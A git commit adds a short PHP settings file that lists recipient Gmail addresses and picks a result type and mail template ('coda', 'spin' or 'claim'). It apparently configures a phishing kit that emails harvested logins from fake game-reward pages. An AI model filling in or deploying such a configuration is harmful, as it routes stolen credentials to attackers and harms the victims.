f40885cecc0b4b26fbf318b7283ac77e29c465d9
veroo-AP <fitrohridhoalfian9@gmail.com>
2026-01-10 20:46:43 +0700

    Add files via upload

---
+++ setting.php
@@ -0,0 +1,12 @@
+<?php
+$email1 = 'qrix.official.dev@gmail.com';
+$email2 = '@gmail.com';
+$email3 = '@gmail.com';
+$email4 = '@gmail.com';
+$email5 = '@gmail.com';
+$email6 = '@gmail.com';
+$email7 = '@gmail.com';
+$email8 = '@gmail.com';
+$jenisress = $coda; //$coda, $spin, $claim
+$jenismail = $coda_mail; //$coda_mail, $spin_mail, $claim_mail
+?>
